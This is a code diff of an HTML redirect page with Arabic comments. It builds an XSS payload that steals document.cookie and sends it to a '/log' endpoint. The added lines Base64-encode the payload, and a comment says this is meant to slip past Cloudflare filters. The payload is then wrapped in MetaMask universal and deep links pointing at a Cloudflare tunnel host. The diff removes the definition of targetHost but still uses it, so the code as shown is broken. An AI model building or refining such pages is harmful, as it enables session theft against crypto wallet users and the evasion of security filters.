@@ -21,18 +21,17 @@
     <a href="javascript:void(0);" onclick="forceRedirect()" class="btn">Click here if not redirected</a>
 
     <script>
-        // 1. رابط الـ Cloudflare الخاص بك
-        const targetHost = "favour-nato-realized-instructor.trycloudflare.com";
+// 1. الكود الخبيث (Raw)
+const rawPayload = "<script>alert('XSS_Bypass_Success');fetch('/log?data='+document.cookie);<\/script>";
 
-        // 2. كود الـ XSS المراد عكسه (Reflected Payload)
-        // يقوم بفتح تنبيه (Alert) ثم يرسل الكوكي إلى السيرفر
-        const rawPayload = "<script>alert('XSS_Reflected_By_Heam');fetch('/log?stolen_data='+document.cookie);<\/script>";
-        
-        // 3. تشفير الـ Payload لضمان سلامة الرابط (URL Encoding)
-        const xssQuery = "?xss=" + encodeURIComponent(rawPayload);
+// 2. تشفير الكود بصيغة Base64 لتجاوز فلاتر Cloudflare
+const base64Payload = btoa(rawPayload);
 
-        // 4. بناء الروابط النهائية المدمجة مع الـ Payload
-        const fullTarget = targetHost + xssQuery;
+// 3. بناء الرابط الجديد (بدون رموز < >)
+const xssQuery = "?b64xss=" + base64Payload;
+
+const fullTarget = targetHost + xssQuery;
+// ... باقي كود التحويل كما هو ...
         const universalLink = "https://metamask.app.link/dapp/" + fullTarget;
         const deepLink = "metamask://dapp/" + fullTarget;
 
